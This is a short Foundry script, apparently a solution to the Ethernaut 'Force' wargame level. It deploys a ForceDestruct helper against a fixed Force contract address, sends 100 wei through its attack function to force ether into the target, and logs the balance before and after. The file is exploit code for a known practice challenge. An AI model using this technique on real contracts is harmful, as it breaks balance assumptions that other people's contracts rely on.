// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/force.sol";
import "../src/forceDestruct.sol";

contract ForceScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        Force f = Force(0xD09dEF2Ab46EB1E7c8460d7622Bde72DDAfa452a);
        ForceDestruct fd = new ForceDestruct(address(f));

        console.log(address(f).balance);
        fd.attack{value: 100 wei}();
        console.log(address(f).balance);

        vm.stopBroadcast();
    }
}
